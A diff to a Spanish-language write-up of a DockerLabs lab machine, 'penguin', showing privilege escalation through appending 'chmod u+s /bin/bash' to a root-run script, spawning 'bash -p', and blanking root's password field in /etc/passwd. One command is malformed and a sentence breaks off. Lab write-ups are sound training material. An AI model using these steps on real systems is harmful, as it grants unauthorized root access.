@@ -175,7 +175,7 @@ Nos conectamos al host mediante ssh con las credenciales encontradas y empezamos
 ssh penguin@172.17.0.2
 ~~~
 
-Sin ir muy lejos, vemos dos archivos en el directorio del usuario Penguin, y como vemos, el script se está ejecutando como root. 
+Sin ir muy lejos, vemos dos archivos en el directorio del usuario Penguin, y revisando los procemos vemos que el script se está ejecutando como root. 
 Veamos que contienen.
 
 ~~~ bash
@@ -183,24 +183,32 @@ ls -lah
 cat archivo.txt
 cat script.sh
 ~~~
-![files]()
+![penguin](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Medium/images/penguin.png?raw=true)
 
-Lo unico que tenemos que hacer es modificar el script para que nos devuelva una shell como root al ejecutarlo.
+~~~ bash
+ps aux | -v grep | grep script.sh
+~~~
+![psaux](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Medium/images/psaux.png?raw=true)
+
+Lo unico que tenemos que hacer es modificar el script.
 
 ~~~ bash
 echo 'chmod u+s /bin/bash' >> script.sh
+ls -la /bin/bash
+/bin/bash -p
 ~~~
-![echo]()
+![echo_binbash](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Medium/images/echo_binbash.png?raw=true)
 
+Como podemos ver, ya tenemos privilegios de root.
+Vamos a modificar el archivo `/etc/passwd` para eliminar la `x` en la línea de root, es una técnica para escalar privilegios. Normalmente, el archivo `/etc/passwd`
 
-
-
-
-
-
-
-
-
+~~~ bash
+nano /etc/passwd
+cat /etc/passwd | grep root
+su
+id
+~~~
+![final](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Medium/images/final.png?raw=true)
 
 
 
